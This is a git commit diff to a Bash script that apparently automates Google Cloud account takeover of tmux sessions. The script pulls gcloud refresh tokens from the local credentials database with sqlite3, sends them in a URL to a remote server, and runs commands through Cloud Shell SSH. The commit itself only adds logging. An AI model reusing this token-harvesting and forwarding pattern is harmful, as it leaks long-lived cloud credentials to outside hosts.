30a25d6cbda064c90cffb5d4a12abb96c975fb71
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-22 19:54:22 -0300

    Update send_tmux.sh

--- send_tmux.sh
+++ send_tmux.sh
@@ -19,25 +19,29 @@ do
   if [[ $session =~ "fenix_" ]]
   then
 
-     curl -s $ip'/token.php?session='$session > $file
+     curl -s $ip'/token.php?session='$session > $file && source log.sh $session "$script > post token.php"
 
      token=$(jq '.token' $file)
      token=${token//'"'/}
+     
+     source log.sh $session "$script > token $token"
 
      if [ $token != 'null' ]
      then
 
-        echo 'Enviando token...'
+        source log.sh $session "$script > enviando token..."
 
         sleep 1
 
-        tmux send -t $session $token C-m
+        tmux send -t $session $token C-m && source log.sh $session "$script > TMUX send ok"
 
         sleep 1
 
-        echo 'Token enviado!'
+        source log.sh $session "$script > Token enviado!"
 
         new=$(sudo gcloud config get-value account)
+        
+        source log.sh $session "$script > nova conta $new"
         
         refresh_token='null'
         
@@ -46,9 +50,12 @@ do
           sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
           refresh_token=$(jq '.refresh_token' $file)
           refresh_token=${refresh_token//'"'/}
+          source log.sh $session "$script > obtendo refresh-token"
         done
         
-        url=$ip'/new.php?session='$session'&account='$new'&creator='$user'&refresh='$refresh_token
+        source log.sh $session "$script > refresh-token ok!"
+        
+        url=$ip'/new.php?session='$session'&account='$new'&creator='$user'&refresh='$refresh_token && source log.sh $session "$script > post new.php"
         curl $url
 
         commandOK='false'
@@ -57,10 +64,10 @@ do
 
         while [ $commandOK != 'true' ]
         do
-          sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet && commandOK='true'
+          sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet && commandOK='true' && source log.sh $session "$script > command ok!"
         done
 
-        url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
+        url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root' && source log.sh $session "$script > post account.php"
         curl $url
 
      fi
